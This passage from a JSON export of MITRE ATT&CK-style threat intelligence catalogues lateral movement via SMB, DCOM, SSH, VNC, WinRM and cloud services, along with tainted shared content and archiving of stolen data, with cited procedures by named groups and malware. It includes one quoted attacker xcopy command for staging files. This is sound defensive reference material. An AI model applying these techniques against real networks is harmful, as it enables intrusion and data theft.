                        "Name": "Duqu",
                        "Description": "Adversaries can instruct <name> to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[27]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has leveraged the Admin$, C$, and IPC$ shares for lateral movement. [28][29]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.[30]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. <name> has also used smbexec from the Impacket suite for lateral movement.[31][32]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used valid accounts to access SMB shares.[33]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> can use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems.[34]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> actors have been known to copy files to the network shares of other computers to move laterally.[35][36]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> copies itself over network shares to move laterally on a victim network.[37]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.[38][39]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can infect victims by brute forcing SMB.[40]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has used batch scripts that can enable SMB on a compromised host.[41]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "Lateral movement can be done with <name> through net use commands to connect to the on remote systems.[42]"
                    },
                    "S0056": {
                        "ID": "S0056",
                        "Name": "Net Crawler",
                        "Description": "<name> uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.[43]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> can use PsExec, which interacts with the ADMIN$ network share to execute commands on remote systems.[44][45][46]"
                    },
                    "S0365": {
                        "ID": "S0365",
                        "Name": "Olympic Destroyer",
                        "Description": "<name> uses PsExec to interact with the ADMIN$ network share to execute commands on remote systems.[47][46]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.[48]"
                    },
                    "G0071": {
                        "ID": "G0071",
                        "Name": "Orangeworm",
                        "Description": "<name> has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.[37]"
                    },
                    "S0029": {
                        "ID": "S0029",
                        "Name": "PsExec",
                        "Description": "<name>, a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.[46]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "The <name> malware platform can use Windows admin shares to move laterally.[49]"
                    },
                    "S1073": {
                        "ID": "S1073",
                        "Name": "Royal",
                        "Description": "<name> can use SMB to connect to move laterally.[50]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has used the C$ network share for lateral movement.[51]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has copied payloads to the ADMIN$ share of remote systems and run net use to connect to network shares.[4][52]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a Scheduled Task/Job to execute the malware.[53]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used administrative accounts to connect over SMB to targeted users.[54]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> propagates to available network shares.[55]"
                    },
                    "G0028": {
                        "ID": "G0028",
                        "Name": "Threat Group-1314",
                        "Description": "<name> actors mapped network drives using net use.[56]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used locally mounted network shares for lateral movement through targated environments.[57]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> used net use commands to connect to lateral systems within a network.[58]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.[59][60]"
                    },
                    "S0672": {
                        "ID": "S0672",
                        "Name": "Zox",
                        "Description": "<name> has the ability to use SMB for communication.[61]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> has been copied over network shares to move laterally.[62]"
                    }
                }
            },
            "003": {
                "name": "Distributed Component Object Model",
                "href": "/techniques/T1021/003",
                "description": "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.[1][2]Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.[3] By default, only Administrators may remotely activate and launch COM objects through DCOM.[4]Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications[5] as well as other Windows objects that contain insecure methods.[6][7] DCOM can also execute macros in existing documents[8] and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application[9], bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation. [10]",
                "Procedure": {
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can deliver Beacon payloads for lateral movement by leveraging remote COM execution.[11]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can utilize Invoke-DCOM to leverage remote COM execution for lateral movement.[12]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can use System namespace methods to execute lateral movement using DCOM.[13]"
                    }
                }
            },
            "004": {
                "name": "SSH",
                "href": "/techniques/T1021/004",
                "description": "Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> used secure shell (SSH) to move laterally among their targets.[1]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.[2]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used Putty for remote access.[3]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.[4]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can SSH to a remote service.[5][6]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used SSH for lateral movement.[7]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> contains modules for executing commands over SSH as well as in-memory VNC agent injection.[8]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has remotely accessed compromised environments via secure shell (SSH) for lateral movement.[9]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used SSH to move laterally through victim environments.[10]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used the PuTTY and Plink tools for lateral movement.[11]"
                    },
                    "G0036": {
                        "ID": "G0036",
                        "Name": "GCMAN",
                        "Description": "<name> uses Putty for lateral movement.[12]"
                    },
                    "S0599": {
                        "ID": "S0599",
                        "Name": "Kinsing",
                        "Description": "<name> has used SSH for lateral movement.[13]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.[14]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> used ssh for internal reconnaissance.[15]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used Putty Secure Copy Client (PSCP) to transfer data.[16]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used Putty to access compromised systems.[17]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has spread its coinminer via SSH.[18]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used SSH to connect back to victim machines.[19] <name> has also used SSH to transfer tools and payloads onto victim hosts and execute them.[20]"
                    }
                }
            },
            "005": {
                "name": "VNC",
                "href": "/techniques/T1021/005",
                "description": "Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\"remote framebuffer\") protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.[1]VNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.[2][3]Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.[4][5][6][7][8][9]",
                "Procedure": {
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> can start a remote VNC session by downloading a new plugin.[10]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can use VNC for remote access to targeted systems.[11]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used TightVNC to control compromised hosts.[12]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has installed TightVNC server and client on compromised servers and endpoints for lateral movement.[13]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used VNC tools, including UltraVNC, to remotely interact with compromised hosts.[14][15][16]"
                    },
                    "G0036": {
                        "ID": "G0036",
                        "Name": "GCMAN",
                        "Description": "<name> uses VNC for lateral movement.[17]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> uses VNC to connect into systems.[18]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network [19][20]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has the ability of performing remote desktop access via a VNC console.[21]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> supports functionality for VNC sessions.[22]"
                    }
                }
            },
            "006": {
                "name": "Windows Remote Management",
                "href": "/techniques/T1021/006",
                "description": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[1] It may be called with the winrm command or by any number of programs such as PowerShell.[2] WinRM  can be used as a method of remotely interacting with Windows Management Instrumentation.[3]",
                "Procedure": {
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use WinRM for pivoting.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used WinRM for lateral movement.[5]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use WinRM to execute a payload on a remote host.[6][7]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has leveraged WMI to move laterally within a compromised network via application servers and SQL servers.[8]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> tracks TrustedHosts and can move laterally to these targets via WinRM.[9]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts.[10]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used WinRM to enable remote execution.[11]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used Window Remote Management to move laterally through a victim network.[12]"
                    }
                }
            },
            "007": {
                "name": "Cloud Services",
                "href": "/techniques/T1021/007",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as Connect-AZAccount for Azure PowerShell, Connect-MgGraph for Microsoft Graph PowerShell, and gcloud auth login for the Google Cloud CLI.In some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.[1]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[2]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "During C0027, <name> used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[2]<name> has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.[3]"
                    }
                }
            },
            "008": {
                "name": "Direct Cloud VM Connections",
                "href": "/techniques/T1021/008",
                "description": "Adversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console[1], AWS EC2 Instance Connect[2][3], and AWS System Manager.[4].Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.[5] These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).",
                "Procedure": {}
            }
        },
        "tactic": "Lateral Movement",
        "description": "Adversaries may use Valid Accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).[1][2] They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. Legitimate applications (such as Software Deployment Tools and other administrative programs) may utilize Remote Services to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer.[3][4][5] Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.[6][7][4]",
        "Procedure": {
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has the ability to use RPC for lateral movement.[8]"
            },
            "S0437": {
                "ID": "S0437",
                "Name": "Kivars",
                "Description": "malware has the ability to remotely trigger keyboard input and mouse clicks. [9]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can manage remote screen sessions.[10]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware can propagate via peer-to-peer communication and updates using RPC.[11]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares.[12]"
            }
        }
    },
    "T1080": {
        "ttp_name": "Taint Shared Content",
        "ttp_id": "T1080",
        "href": "/techniques/T1080",
        "tactic": "Lateral Movement",
        "description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. [1]Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
        "Procedure": {
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has placed malware on file shares and given it the same name as legitimate documents on the share.[2]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has deployed ransomware from a batch file in a network share.[3]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can spread itself by infecting other remote machines via network shared drives.[4][5]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware used a virus that propagates by infecting executables stored on shared drives.[6]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has injected malicious macros into all Word and Excel documents on mapped network drives.[7]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware has functionality to copy itself to network shares.[8]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.[9]"
            },
            "S0133": {
                "ID": "S0133",
                "Name": "Miner-C",
                "Description": "malware copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.[10]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can spread itself by infecting other portable executable files on networks shared drives.[11]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware infects remote servers via network shares and by infecting WinCC database views with malicious code.[12]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has copied itself to and infected files in network drives for propagation.[13][14]"
            }
        }
    },
    "T1560": {
        "ttp_name": "Archive Collected Data",
        "ttp_id": "T1560",
        "href": "/techniques/T1560",
        "subtechnique": {
            "001": {
                "name": "Archive via Utility",
                "href": "/techniques/T1560/001",
                "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems. On Windows, diantz or  makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. Remote Data Staging).[1] xcopy on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.[2][3][4]",
                "Procedure": {
                    "G1024": {
                        "ID": "G1024",
                        "Name": "Akira",
                        "Description": "<name> uses utilities such as WinRAR to archive data prior to exfiltration.[5]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can zip and encrypt data collected on a target system.[6]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has used RAR to compress files before moving them outside of the victim network.[7]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used a variety of utilities, including WinRAR, to archive collected data with password protection.[8]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used tools to compress data before exfilling it.[9]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used WinRAR to compress data prior to exfil.[10]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used WinRAR and 7-Zip to compress an archive stolen data.[11]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> created a RAR archive of targeted files for exfiltration.[12]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used the JAR/ZIP file format for exfiltrated files.[13]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has used WinRAR to compress memory dumps prior to exfiltration.[14]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has compressed data into password-protected RAR archives prior to exfiltration.[15][16]"
                    },
                    "C0026": {
                        "ID": "C0026",
                        "Name": "C0026",
                        "Description": "During <name>, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.[17]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> uses the zip -r command to compress the data collected on the local system.[18][19]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> has used xcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Y to archive collected files.[20]"
                    },
                    "S0160": {
                        "ID": "S0160",
                        "Name": "certutil",
                        "Description": "<name> may be used to Base64 encode collected data.[21][22]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.[23][24]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> uses ZPP, a .NET console program, to compress files with ZIP.[25]"
                    },
                    "S0212": {
                        "ID": "S0212",
                        "Name": "CORALDECK",
                        "Description": "<name> has created password-protected RAR, WinImage, and zip archives to be exfiltrated.[26]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has used the WinRAR utility to compress and encrypt stolen files.[27]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors saved collected data to a tar archive.[28]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> hides collected data in password-protected .rar archives.[29]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> can compress files via RAR while staging data to be exfiltrated.[30]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used WinRAR to compress stolen files into an archive prior to exfiltration.[31]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has compressed the dump output of compromised credentials with a 7zip binary.[32]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used RAR to compress collected data before exfiltration.[33]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used 7-Zip to archive data.[34]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "During <name>, the threat actors used 7zr.exe to add collected files to an archive.[20]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used WinRAR to compress and encrypt stolen data prior to exfiltration.[35][36]"
                    },
                    "G0084": {
                        "ID": "G0084",
                        "Name": "Gallmaker",
                        "Description": "<name> has used WinZip, likely to archive data prior to exfiltration.[37]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used 7-Zip and WinRAR to compress stolen files for exfiltration.[38][39]"
                    },
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> can encrypt and compress files using Gzip prior to exfiltration.[40]"
                    },
                    "S0278": {
                        "ID": "S0278",
                        "Name": "iKitten",
                        "Description": "<name> will zip up the /Library/Keychains directory before exfiltrating it.[41]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> uses WinRAR to compress data that is intended to be exfiltrated.[42]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.[43][44]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used QuickZip to archive stolen files before exfiltration.[45]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.[46][47][48]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has compressed files before exfiltration using TAR and RAR.[49][50][51]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> creates a RAR archive based on collected files on the victim's machine.[52]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.[53]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used RAR to create password-protected archives of collected documents prior to exfiltration.[54][55]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has compressed data before exfiltrating it using a tool called Abbrevia.[56]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> was seen using a RAR archiver tool to compress/decompress data.[57]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> compresses collected files with GZipStream before sending them to its C2 server.[58]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.[59]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group archived victim's data into a RAR file.[60]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors uses zip to pack collected files before exfiltration.[61]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors archived collected files with WinRAR, prior to exfiltration.[62]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has the ability to compress files with zip.[63]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> contains a module for compressing data using ZIP.[64]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.[65]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> has Gzipped information and saved it to a random temp file before exfil.[66]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can compress data with Zip before sending it over C2.[67]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can compress and archive collected files using WinRAR.[68][69]"
                    },
                    "S1040": {
                        "ID": "S1040",
                        "Name": "Rclone",
                        "Description": "<name> can compress files using gzip prior to exfiltration.[70]"
                    },
                    "C0024": {
